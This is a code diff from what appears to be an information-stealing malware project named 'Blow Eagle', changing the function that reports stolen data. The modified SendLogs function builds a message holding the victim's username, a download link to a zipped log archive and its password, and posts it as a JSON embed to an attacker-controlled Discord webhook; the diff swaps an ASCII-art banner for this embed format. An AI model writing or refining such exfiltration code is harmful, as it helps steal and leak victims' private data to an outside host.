@@ -26,7 +26,8 @@
 #include "../../config/config.cpp"
 #include "../../helper/helper.h"
 
-void manager::SendLogs(std::string zipName,std::string zipPwd, std::string info)
+
+void manager::SendLogs(std::string zipName,std::string zipPwd)
 {
 	printf("send\n");
 
@@ -36,23 +37,13 @@ void manager::SendLogs(std::string zipName,std::string zipPwd, std::string info)
 
 	std::cout << url << std::endl;
 	std::cout << zipPwd << std::endl;
+	
+	std::string title = "!!!hey bro, see Blow Eagle data!!!";
+	std::string content = " 👤User: "+func::GetUser() + " 🔗Link: " + url + " 🔑Password: " + zipPwd;
 
-	std::string logo = R"LOGO(
-❗❗❗Blow Eagle data❗❗❗
-______ _                 _____            _      
-| ___ \ |               |  ___|          | |     
-| |_/ / | _____      __ | |__  __ _  __ _| | ___ 
-| ___ \ |/ _ \ \ /\ / / |  __|/ _` |/ _` | |/ _ \
-| |_/ / | (_) \ V  V /  | |__| (_| | (_| | |  __/
-\____/|_|\___/ \_/\_/   \____/\__,_|\__, |_|\___|
-                                     __/ |       
-                                    |___/        
-❗❗❗hey @everyone see Blow Eagle data❗❗❗
-)LOGO";
+	std::cout << url;
 
-	std::string message = logo + '\n'+ info+"\n\n🔗Link: "+url+"\n🔑Password: |"+ zipPwd+"|\nThe-Blow-Eagle | by Nick Vinesmoke";
+	std::string data = "{\"content\": null,\"embeds\": [{\"title\": \"" + title + "\",\"description\": \"" + content + "\",\"color\": 10181046}]}";
 
-	func::sendDiscordWebhook(config::Bot_url, message);
-
-	std::cout << message << std::endl;
+	func::sendDiscordWebhook(config::Bot_url.c_str(), data.c_str());
 }
